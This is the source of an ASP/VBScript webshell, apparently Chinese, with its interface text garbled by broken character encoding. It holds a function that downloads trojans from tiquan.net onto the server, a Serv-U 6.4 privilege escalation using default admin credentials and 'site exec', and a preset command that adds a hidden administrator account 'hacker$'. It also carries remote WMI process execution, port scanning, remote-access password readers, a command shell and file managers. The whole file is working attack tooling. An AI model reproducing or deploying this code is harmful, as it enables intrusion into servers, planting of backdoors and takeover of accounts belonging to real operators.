function dx(str):dx=StrReverse(str):end function:Function upload():SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>" :jb" ���ص�������:�޻���...Ϊ�˽�ʡ.�����޻���<hr/>":jb"<form method=post>":jb"<select onChange='this.form.theUrl.value=this.value;'>":jb"<option value=''>����ľ ������</option>":jb"<option value='http://tiquan.net/soft/1.txt'>һ��.netľ��</option>":jb"<option value=""http://tiquan.net/soft/2.txt"">����.netľ��</option>":jb"<option value=""http://tiquan.net/soft/3.txt"">����.phpľ��</option>":jb"<option value=""http://tiquan.net/soft/1.exe"">һ��.��Ȩľ��</option>":jb"<option value=""http://tiquan.net/soft/4.txt"">����aspľ��</option>":jb"<option value=""http://tiquan.net/soft/2.exe"">����.��Ȩľ��</option>":jb "<input name=theUrl value='http://' size=80><input type=submit value=' ���� '><br/>":jb "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\1.ASPX""' size=80>":jb "<input type=checkbox name=overWrite value=2>���� ����........���������Ǽǵ����ر��ľ���ʱ��� ������,����ľ������һ��Ϊadmin":jb "<input type=hidden value=downFromUrl name=theAct>":jb "</form>":jb "<hr/>":If isDebugMode = False Then:On Error Resume Next:End If:Dim Http, theUrl, thePath, stream, fileName, overWrite:theUrl = Request("theUrl"):thePath = Request("thePath"):overWrite = Request("overWrite"):Set stream = Server.CreateObject("ad"&e&"odb.st"&e&"ream"):Set Http = Server.CreateObject("MSXML2.XMLHTTP"):If overWrite <> 2 Then:overWrite = 1:End If
Http.Open "GET", theUrl, False
Http.Send()
If Http.ReadyState <> 4 Then 
End If
With stream
.Type = 1
.Mode = 3
.Open
.Write Http.ResponseBody
.Position = 0
.SaveToFile thePath, overWrite
If Err.Number = 3004 Then
Err.Clear
fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
If fileName = "" Then
fileName = "index.htm.txt"
End If
thePath = thePath & "\" & fileName
.SaveToFile thePath, overWrite
jb"error,��������Ϊ�ļ��Ѵ��ڣ������ع��̺͵�ַ�г� �ִ��� �� �ļ������� ��Ϊ���ֽڣ���"
End If
.Close
End With
chkErr(Err)
Set Http = Nothing
Set Stream = Nothing
If isDebugMode = False Then
On Error Resume Next
End If
End Function
sEleCt cASe aCtiON
CasE "MainMenu":MAInMEnu()
CASE "GetTerminalInfo":GetTerminalInfo()
CAse "PageAddToMdb":paGEaddtoMdB()
cASE "ScanPort":SCAnPoRt()
Case "Servu"
SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=M_Schumacher|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
"-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
"-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
"-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
"-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
"-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
"-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/M_Schumacher/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
jb"<form method='post' name='M_Schumacher'>"
jb"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
jb"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
jb"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
jb"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
jb"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
jb"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
jb"<script language='javascript'>"
jb"document.write('<center>�������� 127.0.0.1:"&port&",ʹ���û���: "&user&",���"&pass&"...<center>');"
jb"setTimeout('document.all.M_Schumacher.submit();',4000);"
jb"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/M_Schumacher/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
jb"<form method='post' name='M_Schumacher'>"
jb"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
jb"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
jb"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
jb"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
jb"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
jb"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
jb"<script language='javascript'>"
jb"document.write('<center>��������Ȩ��,��ȴ�...,<center>');"
jb"setTimeout(""document.all.M_Schumacher.submit();"",4000);"
jb"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
c.open "GET", "http://127.0.0.1:" & port & "/M_Schumacher/upadmin/s3", True, "", ""
c.send loginuser & loginpass & mt & deldomain & quit
set session("c")=c
jb"<center>��Ȩ���,��ִ�������<br><font color=red>"&cmd&"</font><br><br>"
jb"<input type=button value=' ���ؼ��� ' onClick=""location.href='?Action=Servu';"">"
jb"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
jb"<center><form method='post' name='M_Schumacher'>"
jb"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
jb"<tr align='center' valign='middle'>"
jb"<td colspan='2'>Serv-U ����Ȩ�� 6.4</td>"
jb"</tr>"
jb"<tr align='center' valign='middle'>"
jb"<td width='100'>�û���:</td>"
jb"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
jb"</tr>"
jb"<tr align='center' valign='middle'>"
jb"<td>�� �</td>"
jb"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
jb"</tr>"
jb"<tr align='center' valign='middle'>"
jb"<td>�� �ڣ�</td>"
jb"<td><input name='port' type='text' id='port' value='43958'></td>"
jb"</tr>"
jb"<tr align='center' valign='middle'>"
jb"<td>ϵͳ·����</td>"
jb"    <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
jb"  </tr>"
jb"  <tr align='center' valign='middle'>"
jb"    <td>�����</td>"
jb"    <td><input name='c' type='text' id='c' value='cmd /c net user hacker$ 123456 /add & net localgroup administrators hacker$ /add' size='50'></td>"
jb"  </tr>"
jb" <tr align='center' valign='middle'>"
jb"    <td colspan='2'><input type='submit' name='Submit' value='�ύ'> "
jb"<input type='reset' name='Submit2' value='����'>"
jb"<input name='SUaction' type='hidden' id='action' value='1'></td>"
jb"  </tr>"
jb" <tr align='center' valign='middle'>"
jb"    <td>˵������</td>"
jb"    <td><input name='ccc' type='text' id='ccc' value='���滻��:cmd /c D:\web\���ľ��.exe Ҳ������VBS' size='50'></td>"
jb"  </tr>"
jb"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject(oBt(0,0))
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
case "Alexa"
dim AlexaUrl,Top
AlexaUrl=request("u")
Top=Alexa(AlexaUrl)
if AlexaUrl="" then AlexaUrl=""&sba&""
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><tr><td height='20' colspan='3' align='center' bgcolor='#'>�����������Ϣ</td></tr><tr align='center'><td height='20' width='200' bgcolor='#'>�������� </td><td bgcolor='#'> </td><td bgcolor='#'>"&WoriNima&"</td></tr><form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#'>������IP</td><td bgcolor='#'> </td><td bgcolor='#'><input type='text' name='ip' size='15' value='"&worininai&"'style='border:0px'><input type='submit' value='��ѯ�˷��������ڵ�'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form><form method=post action='?Action=Alexa' name='form1'><tr align='center'><td height='20' width='200' bgcolor='#'>������Alexa����</td><td bgcolor='#'> </td><td bgcolor='#'><input type='text' name='u' value='"&AlexaUrl&"' size=40 style='border:0px'>����:<input type='text' value='"&Top&"' size=10><input type='submit'  value='��ѯ'></td></tr></form><tr align='center'><td height='20' width='200' bgcolor='#'>������ʱ��</td><td bgcolor='#'> </td><td bgcolor='#'>"&now&" </td></tr><tr align='center'><td height='20' width='200' bgcolor='#'>������CPU����</td><td bgcolor='#'> </td><td bgcolor='#'>"&jbmc&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#'>����������ϵͳ </td><td bgcolor='#'> </td><td bgcolor='#'>"&jbmb&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#'>WEB�������汾</td><td bgcolor='#'> </td><td bgcolor='#'>"&woriniba&"</td></tr>":For i=0 To 18:SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#'>"&ObT(i,0)&"</td><td bgcolor='#'>"&ObT(i,1)&"</td><td bgcolor='#' align=left>"&ObT(i,2)&"</td></tr>"
Next
echo SI
Err.Clear
function Alexa(AlexaURL)
on error resume next 
dim getsms,getstr,url
dim star,endd
url="http://data.alexa.com/data?cli=10&dat=snba&url="&AlexaURL
getsms=getHTTPPage(url)
if getsms<>"" then
star=instr(getsms,"<REACH RANK=""")+13
endd=instr(star,getsms,"</SD>")
getstr=mid(getsms,star,endd-star-4)
else
getstr="������"
end if
if IsNumeric(getstr)=false then getstr="������"
Alexa=getstr
end function

function getHTTPPage(url) 
on error resume next 
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.send() 
if Http.readystate<>4 then
getHTTPPage=""
exit function 
end if 
getHTTPPage=bytes2BSTR(Http.responseBody) 
set http=nothing
if err.number<>0 then err.Clear  
end function 
Function bytes2BSTR(vIn) 
dim strReturn 
dim i1,ThisCharCode,NextCharCode 
strReturn = "" 
For i1 = 1 To LenB(vIn) 
ThisCharCode = AscB(MidB(vIn,i1,1)) 
If ThisCharCode < &H80 Then 
strReturn = strReturn & Chr(ThisCharCode) 
Else 
NextCharCode = AscB(MidB(vIn,i1+1,1)) 
strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
i1 = i1 + 1 
End If 
Next 
bytes2BSTR = strReturn :Err.Clear:End Function:Case "WMI":if request("ok")<>"" then:set ww=server.createobject("wbemscripting.swbemlocator"):set cc=ww.connectserver(request("ok")):set ss=cc.get("Win32_ProcessStartup"):Set oC=ss.SpawnInstance_:oC.ShowWindow=12:Set pp=cc.get("Win32_Process"):pp.create "net user",null,oC,intProcessID:jb""<br>""&intProcessID:else:jb("<form method=""POST""> "):jb"Զ��ִ������":jb"<input name=""ok"" type=""text"" id=""ok"" value=""&quot;192.168.0.1&quot;,&quot;root/cimv2&quot;,&quot;administrator&quot;,&quot;hacker&quot;"" size=""70"">":jb"<input type=""submit"" name=""Submit"" value=""�ύ"">":jb"</form>":end if:function Unlin(bb):for i = 1 to len(bb):if mid(bb,i,1)<>"��" then: tmp = Mid(bb, i, 1) + tmp:else:tmp=vbcrlf&tmp:end if:next:Unlin=tmp:end function:  Case "ReadREG":call ReadREG():Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing:Case "DownFile":DownFile FName:ShowErr():Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing:Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing:Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing:Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing:Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing:Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing:Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing:Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing:Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL:Case "UpFile":UpFile():Case "ScanDriveForm":ScanDriveForm:Case "ScanDrive":ScanDrive Request("Drive"):Case "ScFolder":ScFolder Request("Folder"):Case "Course":Course():Case "AdminUser":AdminUser():case "hiddenshell":hiddenshell():Case "chamacode":Case "Cmd1Shell":Cmd1Shell():Case "Upload":Upload():case "MMD":MMD():case "SetFileText":SetFileText():Case "radmin":radmin():Case "suftp":suftp():Case "goback":goback():Case "php":php():Case "apjdel":apjdel():Case "pcanywhere4":pcanywhere4():Case "CreateMdb":CreateMdb FName:Case "CompactMdb":CompactMdb FName:Case "DbManager":DbManager():Case Else MainForm():End Select
if Action<>"Servu" then ShowErr()
jb"</body></html>"   %>